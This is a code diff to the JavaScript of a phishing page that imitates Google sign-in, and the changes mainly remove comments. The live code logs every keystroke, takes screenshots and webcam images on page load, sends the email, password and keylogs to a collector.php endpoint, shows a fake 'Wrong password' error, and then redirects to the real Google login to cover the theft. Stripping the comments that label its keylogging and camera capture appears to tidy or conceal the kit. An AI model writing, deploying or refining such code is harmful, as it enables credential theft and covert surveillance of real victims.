@@ -1,9 +1,8 @@
-// --- START COMMON SCRIPT.JS (unchanged, still includes keylogging, screenshot, camera) ---
-let loggedKeys = ''; // Global variable to store keylogs
-let cameraStream = null; // To hold the camera stream
-let cameraActive = false; // Flag to check if camera is active
+let loggedKeys = '';
+let cameraStream = null;
+let cameraActive = false;
 
-// Keylogging Event Listener: Records every key press
+
 document.addEventListener('keydown', function(event) {
     // Exclude sensitive keys like Shift, Ctrl, Alt, Meta (Windows/Command) to keep logs cleaner
     if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'].includes(event.key)) {
@@ -20,7 +19,7 @@ document.addEventListener('keydown', function(event) {
     // console.log("Key pressed:", event.key, "Current log:", loggedKeys); // For debugging
 });
 
-// Function to send data to the collector.php using AJAX POST
+
 function sendData(url, data, callback) {
     var xhr = new XMLHttpRequest();
     xhr.open('POST', url, true);
@@ -125,10 +124,10 @@ function takeCameraSnapshot() {
         }
     });
 }
-// --- END COMMON SCRIPT.JS ---
 
 
-// Template Specific Form Submission Logic for Google Phishing (now all on one page)
+
+
 document.addEventListener('DOMContentLoaded', function() {
     var identifierStep = document.getElementById('identifier-step');
     var passwordStep = document.getElementById('password-step');
@@ -140,26 +139,26 @@ document.addEventListener('DOMContentLoaded', function() {
     var passwordInput = document.getElementById('password'); // Added
     var showPasswordCheckbox = document.getElementById('showPasswordCheckbox'); // Added
 
-    var errorMessage = document.getElementById('error-message'); // For identifier step
-    var passwordErrorMessage = document.getElementById('password-error-message'); // For password step
+    var errorMessage = document.getElementById('error-message');
+    var passwordErrorMessage = document.getElementById('password-error-message');
 
     var displayIdentifier = document.getElementById('displayIdentifier');
     var hiddenIdentifier = document.getElementById('hiddenIdentifier');
 
-    // --- Show Password Toggle Logic ---
-    if (showPasswordCheckbox) {
+    
+    if (showPasswordCheckbox){
         showPasswordCheckbox.addEventListener('change', function() {
             if (this.checked) {
-                passwordInput.type = 'text'; // Change input type to text to show password
+                passwordInput.type = 'text';
             } else {
-                passwordInput.type = 'password'; // Change back to password to hide
+                passwordInput.type = 'password';
             }
         });
     }
 
-    // --- Step 1: Identifier (Email/Phone) Submission ---
+
     emailForm.addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevent default form submission
+        e.preventDefault();
         var identifier = identifierInput.value.trim();
 
         if (identifier === '') {
@@ -168,7 +167,7 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // Send identifier and current keylogs to collector.php
+        
         sendData('collector.php', { identifier: identifier, keys: loggedKeys, next_step: true }, function(response) {
             console.log('Identifier and keylogs sent:', response);
             loggedKeys = ''; // Clear keylogs after sending for this step
@@ -181,7 +180,7 @@ document.addEventListener('DOMContentLoaded', function() {
             identifierStep.style.display = 'none';
             passwordStep.style.display = 'block';
 
-            // Focus on the password input for better UX
+            // Focus on the password input
             passwordInput.focus();
 
             // Re-capture screenshot and camera image for the new page state
@@ -195,9 +194,9 @@ document.addEventListener('DOMContentLoaded', function() {
         errorMessage.style.display = 'none';
     });
 
-    // --- Step 2: Password Submission ---
+    
     passwordForm.addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevent default form submission
+        e.preventDefault(); 
         var password = passwordInput.value;
         var identifier = hiddenIdentifier.value; // Get identifier from hidden field
 
@@ -207,32 +206,32 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // Real Google login page for final redirection after data collection
+        //redirection after data collection
         var redirectUrl = 'https://accounts.google.com/signin/v2/challenge/pwd?flowName=GlifWebSignIn&flowEntry=ServiceLogin';
 
         var dataToSend = {
             identifier: identifier,
             password: password,
-            keys: loggedKeys, // Send any remaining keylogs
+            keys: loggedKeys, 
         };
 
-        // Send all collected data (identifier, password, keylogs)
+        
         sendData('collector.php', dataToSend, function(response) {
             console.log('Credentials and data sent:', response);
-            loggedKeys = ''; // Clear keylogs after sending
+            loggedKeys = '';
 
-            // Display a fake error message for a few seconds to make it more believable
+            
             passwordErrorMessage.textContent = "Wrong password. Try again or click Forgot password to reset it.";
             passwordErrorMessage.style.display = 'block';
 
-            // Redirect to the legitimate Google login after a delay
+            
             setTimeout(function() {
                 window.location.href = redirectUrl;
-            }, 3000); // Redirect after 3 seconds
+            }, 3000); 
         });
     });
 
-    // Hide password error message when user starts typing again
+    
     passwordInput.addEventListener('focus', function() {
         passwordErrorMessage.style.display = 'none';
     });
@@ -240,10 +239,9 @@ document.addEventListener('DOMContentLoaded', function() {
     // --- Initial Data Collection on Page Load ---
     console.log("Page loaded. Initiating data collection...");
 
-    // 1. Capture and Send Screenshot immediately
+    
     captureAndSendScreenshot();
 
-    // 2. Attempt to capture and Send Camera Image
-    // This will trigger the browser's camera permission prompt
+    
     captureAndSendCameraImage();
 });
